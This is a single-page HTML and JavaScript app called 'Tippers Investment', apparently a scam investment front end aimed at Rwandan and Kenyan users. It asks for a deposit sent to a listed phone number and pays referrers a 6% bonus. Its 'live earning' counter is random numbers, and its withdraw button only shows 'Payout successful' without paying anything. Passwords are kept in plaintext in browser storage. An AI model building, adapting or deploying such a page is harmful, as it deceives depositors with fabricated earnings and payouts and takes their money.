<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Tippers Investment</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

<style>
body{
margin:0;
font-family:Segoe UI;
background:#0b1120;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
}
.app{
width:380px;
background:#000;
border-radius:20px;
overflow:hidden;
color:white;
display:flex;
flex-direction:column;
}
.content{
padding:20px;
height:520px;
overflow-y:auto;
}
.title{color:#f59e0b;text-align:center;font-weight:bold;}
.desc{text-align:center;margin-top:10px;}
input,select{
width:100%;
padding:10px;
margin-top:8px;
border-radius:8px;
border:none;
background:#0f172a;
color:white;
}
button{
width:100%;
padding:12px;
margin-top:15px;
border:none;
border-radius:10px;
background:linear-gradient(135deg,#f59e0b,#f97316);
color:white;
font-weight:bold;
cursor:pointer;
}
.row{display:flex;gap:5px;}
.nav{
display:flex;
justify-content:space-around;
background:#020617;
padding:10px;
}
.nav div{text-align:center;cursor:pointer;}
.nav i{display:block;font-size:20px;margin-bottom:3px;}
#toast{
position:fixed;
bottom:20px;
left:50%;
transform:translateX(-50%);
background:red;
color:white;
padding:10px;
border-radius:8px;
display:none;
}
.card{
background:#111;
padding:15px;
border-radius:12px;
margin-top:10px;
word-break:break-all;
}
</style>
</head>

<body>

<div class="app">
<div class="content" id="screen"></div>

<div class="nav" id="nav" style="display:none">
<div onclick="home()"><i class="fa fa-home"></i>HOME</div>
<div onclick="deposit()"><i class="fa fa-wallet"></i>DEPOSIT</div>
<div onclick="earn()"><i class="fa fa-chart-line"></i>EARN</div>
<div onclick="withdraw()"><i class="fa fa-money-bill"></i>WITHDRAW</div>
</div>
</div>

<div id="toast"></div>

<script>

/* STORAGE */
let users = JSON.parse(localStorage.getItem("users")) || [];
let currentUser = null;

/* STATE */
let amount = 0;
let selectedPeriod = 0;
let depositDone = false;

/* DOM */
const screen = document.getElementById("screen");
const nav = document.getElementById("nav");

/* HELPERS */
function val(id){ return document.getElementById(id)?.value; }

function toast(msg){
let t=document.getElementById("toast");
t.innerText=msg;
t.style.display="block";
setTimeout(()=>t.style.display="none",2500);
}

/* REF LINK */
function getLink(){
return window.location.origin + window.location.pathname + "?ref=" + currentUser.refCode;
}

/* START */
function start(){
nav.style.display="none";
screen.innerHTML=`
<h2 class="title">WELCOME</h2>
<p class="desc">Start your journey</p>
<button onclick="register()">NEXT</button>
`;
}

/* REGISTER */
function register(){
let ref = new URLSearchParams(window.location.search).get("ref");

screen.innerHTML=`
<h3 class="title">REGISTER</h3>

<input id="f" placeholder="First name">
<input id="l" placeholder="Last name">

<div class="row">
<select id="code">
<option value="+250">RWA +250</option>
<option value="+254">KEN +254</option>
</select>
<input id="phone" placeholder="Phone">
</div>

<input id="email" placeholder="Email">
<input id="pass" placeholder="6 digit password">
<input id="cpass" placeholder="Confirm password">

<button onclick="doRegister('${ref||""}')">REGISTER</button>
`;
}

/* DO REGISTER */
function doRegister(ref){

if(!val("f")||!val("l")||!val("phone")||!val("email")||!val("pass")||!val("cpass")){
toast("Fill all fields"); return;
}

if(val("pass")!==val("cpass")){
toast("Passwords mismatch"); return;
}

let user={
email:val("email"),
pass:val("pass"),
refCode:"REF"+Date.now(),
balance:0,
invitedBy:ref||null,
referrals:[]
};

/* SAVE */
users.push(user);
localStorage.setItem("users",JSON.stringify(users));

toast("Registered ✔");
login();
}

/* LOGIN */
function login(){
screen.innerHTML=`
<h3 class="title">LOGIN</h3>

<input id="le" placeholder="Email">
<input id="lp" placeholder="Password">

<button onclick="doLogin()">LOGIN</button>
`;
}

function doLogin(){

let user = users.find(u=>u.email===val("le") && u.pass===val("lp"));

if(!user){
toast("Invalid login"); return;
}

currentUser = user;
nav.style.display="flex";

home();
}

/* HOME */
function home(){

screen.innerHTML=`
<h3 class="title">DASHBOARD</h3>

<div class="card">
Balance: ${currentUser.balance} RWF
</div>

<div class="card">
Referral Link:<br>
${getLink()}
</div>

<button onclick="copy()">COPY LINK</button>
`;
}

/* COPY */
function copy(){
navigator.clipboard.writeText(getLink());
toast("Copied ✔");
}

/* DEPOSIT */
function deposit(){

screen.innerHTML=`
<h3 class="title">DEPOSIT</h3>

<input id="amt" placeholder="Amount">
<input id="sender" placeholder="Sender name">

<button onclick="pay()">CONTINUE</button>
`;
}

function pay(){

if(!val("amt")||!val("sender")){
toast("Fill all"); return;
}

amount=parseInt(val("amt"));

screen.innerHTML=`
<h3 class="title">PAYMENT</h3>
<div class="card">0792459701</div>
<button onclick="finishDeposit()">FINISH</button>
`;
}

/* FINISH */
function finishDeposit(){

depositDone=true;

/* BONUS 6% */
if(currentUser.invitedBy){
let inviter = users.find(u=>u.refCode===currentUser.invitedBy);
if(inviter){
let bonus = Math.floor(amount * 0.06);
inviter.balance += bonus;
toast("Bonus "+bonus+" RWF sent");
}
}

localStorage.setItem("users",JSON.stringify(users));

toast("Deposit success ✔");
home();
}

/* EARN */
function earn(){

screen.innerHTML=`
<h3 class="title">LIVE EARNING</h3>
<div class="card" id="live">0</div>
`;

let i=0;
setInterval(()=>{
i+=Math.random()*1000;
document.getElementById("live").innerText=Math.floor(i)+" RWF";
},1000);
}

/* WITHDRAW */
function withdraw(){

if(!depositDone){
toast("Deposit first"); return;
}

screen.innerHTML=`
<h3 class="title">WITHDRAW</h3>

<input id="wamt" placeholder="Amount">
<input id="phone" placeholder="Phone">

<button onclick="doWithdraw()">PAYOUT</button>
`;
}

function doWithdraw(){

if(!val("wamt")||!val("phone")){
toast("Fill all"); return;
}

toast("Payout successful ✔");
}

/* START */
start();

</script>
</body>
</html>
